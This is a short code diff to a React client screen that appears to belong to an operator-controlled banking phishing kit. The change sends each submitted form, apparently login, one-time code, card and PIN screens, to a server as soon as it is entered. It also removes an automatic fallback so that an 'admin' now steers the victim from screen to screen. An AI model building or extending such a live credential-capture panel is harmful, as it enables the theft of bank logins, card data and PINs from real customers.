@@ -77,6 +77,9 @@ export default function ClientScreen() {
   // Handle form submissions
   const handleSubmit = (screen: ScreenType, formData: Record<string, any>) => {
     if (connected) {
+      console.log('Enviando datos al servidor:', screen, formData);
+      
+      // Enviar datos al servidor inmediatamente
       sendMessage({
         type: 'CLIENT_INPUT',
         data: {
@@ -86,32 +89,8 @@ export default function ClientScreen() {
         }
       });
       
-      // Auto-navigate to validating screen to simulate processing
+      // Cambiar a pantalla validando mientras esperamos respuesta del admin
       setCurrentScreen(ScreenType.VALIDANDO);
-      
-      // After 3 seconds, the admin would typically change the screen
-      // This is just a fallback for demo purposes
-      setTimeout(() => {
-        // Default next screen if admin doesn't change it
-        const nextScreenMap: Record<ScreenType, ScreenType> = {
-          [ScreenType.FOLIO]: ScreenType.LOGIN,
-          [ScreenType.LOGIN]: ScreenType.CODIGO,
-          [ScreenType.CODIGO]: ScreenType.PROTEGER,
-          [ScreenType.PROTEGER]: ScreenType.TRANSFERIR,
-          [ScreenType.TRANSFERIR]: ScreenType.TARJETA,
-          [ScreenType.TARJETA]: ScreenType.CANCELACION,
-          [ScreenType.NIP]: ScreenType.PROTEGER,
-          [ScreenType.CANCELACION]: ScreenType.FOLIO,
-          [ScreenType.MENSAJE]: ScreenType.FOLIO,
-          [ScreenType.VALIDANDO]: ScreenType.FOLIO
-        };
-        
-        // Only change if we're still on the validating screen (admin hasn't changed it)
-        if (currentScreen === ScreenType.VALIDANDO) {
-          const nextScreen = nextScreenMap[screen] || ScreenType.FOLIO;
-          setCurrentScreen(nextScreen);
-        }
-      }, 3000);
     }
   };
 
